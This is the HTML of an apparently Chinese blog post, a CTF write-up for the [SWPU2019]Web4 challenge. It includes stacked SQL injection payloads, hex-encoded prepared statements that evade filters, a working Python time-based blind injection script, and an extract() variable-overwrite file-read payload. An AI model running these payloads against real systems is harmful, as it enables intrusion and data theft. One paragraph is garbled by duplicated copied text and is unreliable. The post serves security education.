@@ -1,0 +1,754 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [SWPU2019]Web4 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="感觉是sql注入 但注册说没开放，点登录没反应 我们抓包看看 判断注入手法我们账号和密码都输入admin,开始发包和抓包  回显202 username中加入单引号会直接500错误，而闭合引号后会正常显示。因此可大致确定注入存在 由于题目对username进行了严格的检测，所以无法使用单语句进行注入，但是注入点又存在，于是可以尝试进行堆叠注入 我们判断一下堆叠注入是否存在 存在堆叠注入的判断方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[SWPU2019]Web4">
+<meta property="og:url" content="http://example.com/2025/05/10/[SWPU2019]Web4/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="感觉是sql注入 但注册说没开放，点登录没反应 我们抓包看看 判断注入手法我们账号和密码都输入admin,开始发包和抓包  回显202 username中加入单引号会直接500错误，而闭合引号后会正常显示。因此可大致确定注入存在 由于题目对username进行了严格的检测，所以无法使用单语句进行注入，但是注入点又存在，于是可以尝试进行堆叠注入 我们判断一下堆叠注入是否存在 存在堆叠注入的判断方法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/20250430114402531.png">
+<meta property="og:image" content="http://example.com/images/20250430114507090.png">
+<meta property="og:image" content="http://example.com/images/20250430114731724.png">
+<meta property="og:image" content="http://example.com/images/20250430120006416.png">
+<meta property="og:image" content="http://example.com/images/20250430120532376.png">
+<meta property="article:published_time" content="2025-05-10T03:41:53.000Z">
+<meta property="article:modified_time" content="2025-05-11T07:09:15.282Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="PDO场景下的堆叠注入">
+<meta property="article:tag" content="预处理+16进制+时间盲注">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/20250430114402531.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/1737907114de8a.jpg" alt="[SWPU2019]Web4">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[SWPU2019]Web4</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">判断注入手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PDO"><span class="toc-number">2.</span> <span class="toc-text">PDO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">注入思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC"><span class="toc-number">4.</span> <span class="toc-text">构造注入脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">5.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">6.</span> <span class="toc-text">解题</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[SWPU2019]Web4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/05/10/%5BSWPU2019%5DWeb4/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-10T03:41:53.000Z" itemprop="datePublished">2025-05-10</time>
+    <time style="display: none;" id="post-update-time">2025-05-11</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p><img src="/../images/20250430114402531.png" alt="image-20250430114402531"></p>
+<p>感觉是sql注入</p>
+<p>但注册说没开放，点登录没反应</p>
+<p>我们抓包看看</p>
+<h2 id="判断注入手法"><a href="#判断注入手法" class="headerlink" title="判断注入手法"></a>判断注入手法</h2><p><strong>我们账号和密码都输入admin,开始发包和抓包</strong></p>
+<p><img src="/../images/20250430114507090.png" alt="image-20250430114507090"></p>
+<p>回显202</p>
+<p>username中加入单引号会直接500错误，而闭合引号后会正常显示。因此可大致确定注入存在</p>
+<p>由于题目对username进行了严格的检测，所以无法使用单语句进行注入，但是注入点又存在，于是可以尝试进行堆叠注入</p>
+<p>我们判断一下堆叠注入是否存在</p>
+<p><strong><code>存在堆叠注入的判断方法</code></strong> : <strong>名称处加单引号报错，加双引号不报错，加单引号和分号不报错，说明存在堆叠注入。</strong></p>
+<p>根据判断方法，当我们在 <strong><code>username</code></strong> 输入 <strong><code>admin&#39;</code></strong> 或者 <strong><code>admin;&#39;</code></strong> ，提示报错</p>
+<p><img src="/../images/20250430114731724.png" alt="image-20250430114731724"></p>
+<p>当我们在 <strong><code>username</code></strong> 输入：<strong><code>admin</code></strong> 或者 <strong><code>admin’;</code></strong> 报错消失</p>
+<p>说明堆叠注入存在</p>
+<h2 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h2><p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-pdo.html">PHP PDO | 菜鸟教程</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/3582">PDO场景下的SQL注入探究-先知社区</a></p>
+<p>默认是pdo对象的query语句是能执行有;参与的多语句执行的，那我们就能闭合前面的单引号后进行堆叠注入</p>
+<h2 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h2><p> <strong>由于我们没收到特殊回显和被过滤掉了许多关键字。我们构造的脚本考虑采用十六进制加预处理加上时间盲注进行绕过</strong></p>
+<ul>
+<li><strong>为什么用十六进制SQL预处理语句+时间盲注来绕过</strong></li>
+</ul>
+<p>因为SQL关键字被绕过而且回显并不特别的情况下再加上某些单词如 <code>select,if.sleep</code> 必须使用，盲注考虑后觉得时间盲注可能性比较大</p>
+<ul>
+<li><strong>时间盲注思路</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(5),1) </span><br></pre></td></tr></table></figure>
+
+<p><code>&#123;0&#125;</code> 猜测字段的长度 ， <code>&#123;1&#125;</code> 是32-128的ascii数值（用来盲注爆破）</p>
+<ul>
+<li><p><strong>防止SQL预处理被过滤</strong></p>
+<p>  使用16进制</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(&#x27;select sleep(5)&#x27;);</span><br><span class="line">mysql&gt; set @a=0x73656C65637420736C656570283529;</span><br><span class="line">mysql&gt; prepare test from @a;</span><br><span class="line">mysql&gt; execute test;</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>select sleep(5)</code></strong> 语句可以让mysql服务休息5秒。这里这四句相当于执行了该语句，从而绕过上传被过滤的字符串。</p>
+<p>在SQL测试中发现确实可以执行</p>
+<h2 id="构造注入脚本"><a href="#构造注入脚本" class="headerlink" title="构造注入脚本"></a>构造注入脚本</h2><p><strong>通过mysql预处理与hex绕过过滤来构建脚本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#author: c1e4r</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    #题目地址</span><br><span class="line">    url = &#x27;&#x27;&#x27;http://ed59e513-784d-42b5-81d0-2c4dc976d086.node3.buuoj.cn/index.php?r=Login/Index&#x27;&#x27;&#x27;</span><br><span class="line">    #注入payload</span><br><span class="line">    payloads = &quot;admin&#x27;;set @a=0x&#123;0&#125;;prepare b from @a;execute b--+&quot;</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    for i in range(1,30):</span><br><span class="line">        #查询payload</span><br><span class="line">        payload = &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span><br><span class="line">        for j in range(0,128):</span><br><span class="line">            #将构造好的payload进行16进制转码和json转码</span><br><span class="line">            datas = &#123;&#x27;username&#x27;:payloads.format(str_to_hex(payload.format(i,j))),&#x27;password&#x27;:&#x27;test213&#x27;&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            if time.time() - times &gt;= 3:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"> </span><br><span class="line">def str_to_hex(s):</span><br><span class="line">    return &#x27;&#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;, &#x27;&#x27;) for c in s])</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>回显出来**<code>glzjin_wants_a_girl_friend.zip</code>**</p>
+<p>一个压缩文件</p>
+<p>下载下来</p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p><img src="/../images/20250430120006416.png" alt="image-20250430120006416"></p>
+<p>看样子就是一个简单的<strong>mvc</strong>框架。很明显，我们要通过某种方法将flag.php中的文件内容给读取出来</p>
+<p>先说下url大致的解析流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">从r参数中获取要访问的Controller以及Action,然后以/分隔开后拼接成完整的控制器名。</span><br><span class="line">以Login/Index为例，</span><br><span class="line">就是将Login/Index分隔开分别拼接成LoginController以及actionIndex,然后调用LoginController这个类中的actionIndex方法。</span><br><span class="line"></span><br><span class="line">每个action里面会调用对应的loadView()方法进行模版渲染，然后将页面返回给客户端。若访问的Controller不存在则默认解析Login/Index。</span><br></pre></td></tr></table></figure>
+
+<p>来看文件关键代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/Controller/BaseController.php</span><br><span class="line">....</span><br><span class="line">public function loadView($viewName =&#x27;&#x27;, $viewData = [])</span><br><span class="line">&#123;</span><br><span class="line">   $this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;;</span><br><span class="line">   if(file_exists($this-&gt;viewPath))</span><br><span class="line">   &#123;</span><br><span class="line">      extract($viewData);</span><br><span class="line">      include $this-&gt;viewPath;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中 ,BaseController的loadView方法发现使用了extract，后面又include了一个文件。那么意味着只要v i e w D a t a 可 控 我 们 即 可 覆 盖 掉 viewData可控我们即可覆盖掉viewData可控我们即可覆盖掉this-&gt;viewPath文件中的某些变量。而t h i s − &gt; v i e w P a t h 正 是 要 返 回 给 客 户 端 的 。 寻 找 几 个 调 用 loadView 的 方 法 , 发 现 一 个 对 this-&gt;viewPath正是要返回给客户端的。 寻找几个调用loadView的方法,发现一个对this−&gt;viewPath正是要返回给客户端的。</p>
+<p>寻找几个调用loadView的方法,发现一个对viewData完全可控的地方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/Controller/UserController.php</span><br><span class="line">public function actionIndex()</span><br><span class="line">&#123;</span><br><span class="line">    $listData = $_REQUEST;</span><br><span class="line">    $this-&gt;loadView(&#x27;userIndex&#x27;,$listData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$listData是从REQUEST提取出来的，完全可控。而其对应的&#x2F;View&#x2F;userIndex.php中存在一个文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.......</span><br><span class="line">                if(!isset($img_file)) &#123;</span><br><span class="line">                    $img_file = &#x27;/../favicon.ico&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">                $img_dir = dirname(__FILE__) . $img_file;</span><br><span class="line">                $img_base64 = imgToBase64($img_dir);</span><br><span class="line">                echo &#x27;&lt;img src=&quot;&#x27; . $img_base64 . &#x27;&quot;&gt;&#x27;;       //图片形式展示</span><br><span class="line">                ?&gt;&lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function imgToBase64($img_file) &#123;</span><br><span class="line">                return $img_base64; //返回图片的base64</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>大致意思为读取<code>$img_file</code>的内容，然后以base64的形式输出图片。<br><code>imgfile</code> 可 通 过 <code>extract(viewData)</code>变量覆盖漏洞完全控制，而<code>$viewData</code>是受用户控制的完全控制的。所以这里就存在一个任意文件读取漏洞。</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>所以访问:<code>index.php?r=User/Index&amp;img_file=/…/flag.php</code>可直接获取flag.php经base64后的内容</p>
+<p><img src="/../images/20250430120532376.png" alt="image-20250430120532376"></p>
+<p>解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先调用UserController的actionindex方法，将img_file变量覆盖为/../flag.php，然后返回base64后的结果</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/PDO%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" rel="tag">PDO场景下的堆叠注入</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E9%A2%84%E5%A4%84%E7%90%86-16%E8%BF%9B%E5%88%B6-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" rel="tag">预处理+16进制+时间盲注</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/126839103p0master1200.jpg" data-sizes="auto" alt="[2020 新春红包题]1" class="lazyload">
+        
+        <a href="/2025/05/10/%5B2020%20%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98%5D1/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [2020 新春红包题]1
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="[HFCTF 2021 Final]easyflask" class="lazyload">
+        
+      
+      <a href="/2025/05/09/%5BHFCTF%202021%20Final%5Deasyflask/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [HFCTF 2021 Final]easyflask
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        284k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        20:48
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">判断注入手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PDO"><span class="toc-number">2.</span> <span class="toc-text">PDO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">注入思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC"><span class="toc-number">4.</span> <span class="toc-text">构造注入脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">5.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">6.</span> <span class="toc-text">解题</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
